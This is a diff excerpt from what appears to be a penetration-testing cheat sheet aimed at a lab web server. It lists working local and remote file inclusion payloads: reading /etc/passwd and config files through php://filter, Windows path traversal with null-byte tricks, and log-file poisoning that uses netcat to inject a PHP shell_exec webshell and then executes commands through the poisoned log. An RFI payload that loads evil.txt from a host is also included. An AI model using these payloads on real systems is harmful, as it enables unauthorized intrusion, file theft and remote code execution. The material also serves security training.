@@ -1049,21 +1049,26 @@ curl -s http://10.11.1.111/gallery.php?page=/etc/passwd
 http://10.11.1.111/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd && base64 -d savefile.php
 http://10.11.1.111/page=http://10.11.1.111/maliciousfile.txt%00 or ?
 ?page=php://filter/convert.base64-encode/resource=../config.php
-../../../../../boot.ini  #Windows file
+
 file=C:\windows\system32\drivers\etc\hosts  #Windows file
 
 amap -d 10.11.1.111 8000
 
 # LFI Windows
+
 http://10.11.1.111/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00
 
+../../../../../boot.ini  #Windows file
+
+
 # Contaminating log files
+
 root@kali:~# nc -v 10.11.1.111 80
 10.11.1.111: inverse host lookup failed: Unknown host
 (UNKNOWN) [10.11.1.111] 80 (http) open
  <?php echo shell_exec($_GET['cmd']);?>
 
-http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig
+http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig  #Will work if directory traversal is available.
 
 # RFI:
 http://10.11.1.111/addguestbook.php?LANG=http://10.11.1.111:31/evil.txt%00
